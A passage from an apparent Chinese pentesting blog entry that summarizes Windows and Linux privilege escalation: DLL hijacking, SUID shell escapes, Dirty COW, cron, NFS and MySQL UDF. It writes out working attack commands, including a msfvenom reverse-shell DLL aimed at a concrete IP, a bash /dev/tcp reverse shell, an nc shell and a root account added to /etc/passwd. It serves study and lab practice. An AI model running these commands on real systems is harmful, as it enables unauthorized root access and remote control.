&lt;h3 id=&#34;12-dll劫持提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#12-dll劫持提权&#34;&gt;#&lt;/a&gt; 12 DLL 劫持提权&lt;/h3&gt;
&lt;h4 id=&#34;原理-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理-2&#34;&gt;#&lt;/a&gt; 原理&lt;/h4&gt;
&lt;p&gt;Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：&lt;/p&gt;
&lt;p&gt;1、应用程序加载的目录&lt;/p&gt;
&lt;p&gt;2、C:\Windows\System32&lt;/p&gt;
&lt;p&gt;3、C:\Windows\System&lt;/p&gt;
&lt;p&gt;4、C:\Windows&lt;/p&gt;
&lt;p&gt;5、当前工作目录 Current Working Directory，CWD&lt;/p&gt;
&lt;p&gt;6、在 PATH 环境变量的目录（先系统后用户）&lt;/p&gt;
&lt;p&gt;过程：信息收集 - 进程调试 - 制作 dll 并上传 - 替换 dll - 启动应用后成功&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &amp;gt;/opt/test.dll&lt;/p&gt;
&lt;h3 id=&#34;13-常用系统漏洞-cve-windows10-windows72008-windows78-200820122016-sql-server-iis通杀-针对本地用户的不能用于域用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#13-常用系统漏洞-cve-windows10-windows72008-windows78-200820122016-sql-server-iis通杀-针对本地用户的不能用于域用户&#34;&gt;#&lt;/a&gt; 13 常用系统漏洞 CVE Windows10 Windows7/2008 Windows7/8、2008/2012/2016 SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)&lt;/h3&gt;
&lt;h5 id=&#34;windows10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows10&#34;&gt;#&lt;/a&gt; Windows10&lt;/h5&gt;
&lt;p&gt;CVE-2020-0796 &lt;a href=&#34;https://www.cnblogs.com/-chenxs/p/12618678.html&#34;&gt;https://www.cnblogs.com/-chenxs/p/12618678.html&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&#34;windows72008&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows72008&#34;&gt;#&lt;/a&gt; Windows7/2008&lt;/h5&gt;
&lt;p&gt;CVE-2018-8120 &lt;a href=&#34;https://www.cnblogs.com/-mo-/p/11404598.html&#34;&gt;https://www.cnblogs.com/-mo-/p/11404598.html&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&#34;windows78-200820122016&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows78-200820122016&#34;&gt;#&lt;/a&gt; Windows7/8、2008/2012/2016&lt;/h5&gt;
&lt;p&gt;CVE-2017-0213 &lt;a href=&#34;https://www.cnblogs.com/-mo-/p/11446144.html&#34;&gt;https://www.cnblogs.com/-mo-/p/11446144.html&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&#34;sql-server-iis通杀-针对本地用户的不能用于域用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-server-iis通杀-针对本地用户的不能用于域用户&#34;&gt;#&lt;/a&gt; SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)&lt;/h5&gt;
&lt;p&gt;MS16-075(RottenPotato) &lt;a href=&#34;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075&#34;&gt;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;二-linux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-linux&#34;&gt;#&lt;/a&gt; 二、linux&lt;/h2&gt;
&lt;h3 id=&#34;1-suid提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-suid提权&#34;&gt;#&lt;/a&gt; 1 suid 提权&lt;/h3&gt;
&lt;p&gt;程序 &lt;code&gt;ls -l&lt;/code&gt;  如果有个 s 位，即有 suid&lt;/p&gt;
&lt;p&gt;Ubuntu 16.04 以后，无法直接使用 SUID+ &lt;code&gt;system()&lt;/code&gt;  的方式来提权，Ubuntu 发行版官方对 dash 进行了修改：&lt;strong&gt;当 dash 以 suid 权限运行、且没有指定 &lt;code&gt;-p&lt;/code&gt;  选项时，将会丢弃 suid 权限，恢复当前用户权限&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-找到有root权限的程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-找到有root权限的程序&#34;&gt;#&lt;/a&gt; （1） 找到有 root 权限的程序&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-user&lt;/span&gt; root &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-4000&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-print&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;s &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; f &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-user&lt;/span&gt; root &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-4000&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ls&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ldb&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;2可用于suid提权的程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2可用于suid提权的程序&#34;&gt;#&lt;/a&gt; （2）可用于 suid 提权的程序&lt;/h4&gt;
&lt;h5 id=&#34;1-nmap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-nmap&#34;&gt;#&lt;/a&gt; ① nmap&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;较旧版本的 Nmap（2.02 至 5.21）具有交互模式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进入交互模式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap --interactive
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提权：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap&amp;gt; !sh
sh-3.2# whoami
root
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;msf 中的可提权模块：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exploit/unix/local/setuid_nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;2-find&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-find&#34;&gt;#&lt;/a&gt; ② find&lt;/h5&gt;
&lt;p&gt;提权：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;touch anyfile #必须要有这个文件
find anyfile -exec whoami \;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;进入交互：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#进入shell
find anyfile -exec &#39;/bin/sh&#39; \;
sh-5.0# whoami
root
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;广播 shell（出网）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;find user -exec nc -lvp 4444 -e &#39;/bin/sh&#39; \;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在攻击机：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc 靶机ip 4444
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;反弹 shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;find anyfile -exec bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/114.xxx.xxx.96/4444 0&amp;gt;&amp;amp;1&#39; \;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在攻击机：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvvp 4444
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;3-vim&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-vim&#34;&gt;#&lt;/a&gt; ③ Vim&lt;/h5&gt;
&lt;p&gt;如果以 SUID 运行，它将继承 root 用户权限，可以读取系统上的所有文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim.tiny  /etc/passwd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过 vim 进入 shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim.tiny
#vim命令
:set shell = &#39;/bin/sh&#39;
:shell
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;4-bash&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-bash&#34;&gt;#&lt;/a&gt; ④ Bash&lt;/h5&gt;
&lt;p&gt;用 root 打开一个 bash shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;5-less&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-less&#34;&gt;#&lt;/a&gt; ⑤ less&lt;/h5&gt;
&lt;p&gt;进入 shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;less /etc/passwd
#在less中输入:
!/bin/sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;6-more&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-more&#34;&gt;#&lt;/a&gt; ⑥ more&lt;/h5&gt;
&lt;p&gt;进入 shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;more /etc/passwd
#在more中输入:
!/bin/sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;要注意的是使用 more 和 less 一定读取一个比较大的文件，如果文件太小无法进入翻页功能也就无法使用 &lt;code&gt;!&lt;/code&gt;  命令进入 shell&lt;/p&gt;
&lt;h5 id=&#34;7-nano&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-nano&#34;&gt;#&lt;/a&gt; ⑦ nano&lt;/h5&gt;
&lt;p&gt;进入 shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nano #进入nano编辑器
Ctrl + R
Ctrl + X 
#即可输入命令
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;8-cpmv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-cpmv&#34;&gt;#&lt;/a&gt; ⑧ cp/mv&lt;/h5&gt;
&lt;p&gt;使用 cp 命令覆盖原来的 &lt;code&gt;/etc/passwd&lt;/code&gt;  文件&lt;/p&gt;
&lt;p&gt;生成密码：（这里 abcd 为密码）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl passwd -1 -salt 1*2*3 abcd
$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将 &lt;code&gt;/etc/passwd&lt;/code&gt;  复制到当前位置进行修改&lt;/p&gt;
&lt;p&gt;底部添加：用户名：密码，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;moyao:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即可添加账户&lt;/p&gt;
&lt;h5 id=&#34;9-awk&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9-awk&#34;&gt;#&lt;/a&gt; ⑨ awk&lt;/h5&gt;
&lt;p&gt;awk 命令进入 shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;awk &#39;BEGIN &amp;#123;system(&amp;quot;/bin/bash&amp;quot;)&amp;#125;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;10-其它&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10-其它&#34;&gt;#&lt;/a&gt; ⑩ 其它&lt;/h5&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20240513094825632.png&#34; alt=&#34;image-20240513094825632&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-内核漏洞脏牛提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-内核漏洞脏牛提权&#34;&gt;#&lt;/a&gt; 2 内核漏洞脏牛提权&lt;/h3&gt;
&lt;h5 id=&#34;1查看版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1查看版本&#34;&gt;#&lt;/a&gt; （1）查看版本&lt;/h5&gt;
&lt;p&gt;查看发行版本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat /etc/issue

cat /etc/*-release
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看内核版本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;uname -a
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;2msf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2msf&#34;&gt;#&lt;/a&gt; （2）msf&lt;/h5&gt;
&lt;p&gt;例如：内核版本 3.2.78&lt;/p&gt;
&lt;p&gt;搜索该版本漏洞：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;searchsploit linux 3.2.78
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212041598-1644502075.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到提权脚本：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212042016-1033310053.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;编译：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -pthread 40839.c -o 40839 -lcrypt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行后输入密码进行提权：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212044127-654163967.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;3linux-exploit-suggester&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3linux-exploit-suggester&#34;&gt;#&lt;/a&gt; （3）linux-exploit-suggester&lt;/h5&gt;
&lt;p&gt;要出网查 poc，暂时不整理&lt;/p&gt;
&lt;h3 id=&#34;3-计划任务提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-计划任务提权&#34;&gt;#&lt;/a&gt; 3 计划任务提权&lt;/h3&gt;
&lt;p&gt;系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。&lt;/p&gt;
&lt;p&gt;利用命令如下命令列出一些计划任务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ls -l /etc/cron*

cat /etc/crontab
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049570-772756241.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升&lt;/p&gt;
&lt;p&gt;权限配置不当，例如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049975-2144042977.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://xn--roottest-z09lrnp1fu6xurk1wo342giqj799e07xad1e.sh&#34;&gt;发现存在一个 root 身份运行的 test.sh&lt;/a&gt;，那我们当相应的目录下去查看一下这个计划任务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /sbin;ls -l test.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050205-1914296344.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现这里权限配置为 777，就是说我们普通用户也能去修改这个 test.sh 文件，那我们对文件进行修改，然后进行提权。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050438-1720194396.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就到 /tmp 等待计划任务的执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050685-1766592938.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;产生后对 bash 文件进行执行即可进行提权&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050956-1947031195.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-sudo提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-sudo提权&#34;&gt;#&lt;/a&gt; 4 sudo 提权&lt;/h3&gt;
&lt;h4 id=&#34;1免密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1免密码&#34;&gt;#&lt;/a&gt; （1）免密码&lt;/h4&gt;
&lt;h4 id=&#34;2密码爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2密码爆破&#34;&gt;#&lt;/a&gt; （2）密码爆破&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;john --user-test test.hash
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;5-密码复用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-密码复用&#34;&gt;#&lt;/a&gt; 5 密码复用&lt;/h3&gt;
&lt;p&gt;字面意思&lt;/p&gt;
&lt;h3 id=&#34;6-nfs提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-nfs提权&#34;&gt;#&lt;/a&gt; 6 NFS 提权&lt;/h3&gt;
&lt;p&gt;当服务器中存在 NFS 共享，且开启了 no_root_squash 选项时，这时如果客户端使用的是 root 用户，那么对于共享目录来说，该客户端就有 root 权限，可以使用它来提升权限。&lt;/p&gt;
&lt;p&gt;① 查看 NFS 服务器上的共享目录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo showmount -e x.x.x.x
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;② 创建本地挂载目录，挂载共享目录。使用攻击者本地 root 权限创建 Suid shell。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo mkdir -p /tmp

sudo mount -t nfs x.x.x.x:/home/test /tmp

cp /bin/bash /tmp/shell

chmod u+s /tmp/shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;③ 回到要提权的服务器上，使用普通用户使用 shell -p 来获取 root 权限。&lt;/p&gt;
&lt;h3 id=&#34;7-数据库提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-数据库提权&#34;&gt;#&lt;/a&gt; 7 数据库提权&lt;/h3&gt;
&lt;h4 id=&#34;1udf提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1udf提权&#34;&gt;#&lt;/a&gt; （1）UDF 提权&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/database/291175.html&#34;&gt;【数据库提权系列】—【Mysql-UDF 提权篇】 - FreeBuf 网络安全行业门户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/675466196&#34;&gt;linux 环境下的 MySQL UDF 提权 - 知乎 (zhihu.com)&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍：&lt;/h5&gt;
&lt;p&gt;​		UDF（user defind function）用户自定义函数，通过添加新函数，对 MySQL 的功能进行扩充。调用方式与一般系统自带的函数相同，例如 user ()，version () 等函数。&lt;/p&gt;
&lt;p&gt;​		udf 文件后缀在 windows 与 linux 系统下分别为 dll 与 so，即动态链接库文件，由 C、C++ 编写。&lt;/p&gt;
&lt;h5 id=&#34;利用条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用条件&#34;&gt;#&lt;/a&gt; 利用条件：&lt;/h5&gt;
&lt;p&gt;1、常规情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;mysql 配置文件 secure_file_priv 项设置为空，（如果为 NULL 或 /tmp/ 等指定目录，即无法自定义 udf 文件导出位置，则无法利用）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CREATE 权限、FILE 权限（root 用户默认拥有所有权限）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、特殊情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;INSERT 权限、UPDATE 权限、DELETE 权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查看当前数据库用户权限：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1)\G;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;版本特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#版本特性&#34;&gt;#&lt;/a&gt; 版本特性&lt;/h5&gt;
&lt;p&gt;udf 提权操作中的一个步骤是将我们的 udf 文件上传到 mysql 的检索目录中，Windows 系统下 mysql 各版本的检索目录有所不同：&lt;/p&gt;
&lt;h4 id=&#34;2mof提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2mof提权&#34;&gt;#&lt;/a&gt; （2）MOF 提权&lt;/h4&gt;
&lt;h4 id=&#34;3启动项提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3启动项提权&#34;&gt;#&lt;/a&gt; （3）启动项提权&lt;/h4&gt;
&lt;h4 id=&#34;4cve-2016-6663-cve-2016-6664组合提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4cve-2016-6663-cve-2016-6664组合提权&#34;&gt;#&lt;/a&gt; （4）CVE-2016-6663、CVE-2016-6664 组合提权&lt;/h4&gt;
&lt;h4 id=&#34;5反弹端口提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5反弹端口提权&#34;&gt;#&lt;/a&gt; （5）反弹端口提权&lt;/h4&gt;
&lt;h2 id=&#34;题目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;这道题应该是专门练提权的：&lt;a href=&#34;https://www.vulnhub.com/entry/42challenge-1,465/&#34;&gt;42Challenge: 1 ~ VulnHub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;windows：&lt;a href=&#34;https://www.freebuf.com/articles/network/277954.html&#34;&gt;内网渗透基石篇–权限提升（上） - FreeBuf 网络安全行业门户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;linux 内核：&lt;a href=&#34;https://blog.csdn.net/qq_29864185/article/details/107154916&#34;&gt;渗透测试 — 提权方式总结_渗透提权 - CSDN 博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/sfsec/p/15163907.html&#34;&gt;最详细 Linux 提权总结（建议收藏） - 随风 kali - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/sfsec/p/15162635.html&#34;&gt;最全 Windows 提权总结（建议收藏） - 随风 kali - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="pentesting" />
        <updated>2024-05-12T09:27:14.000Z</updated>
    </entry>
</feed>
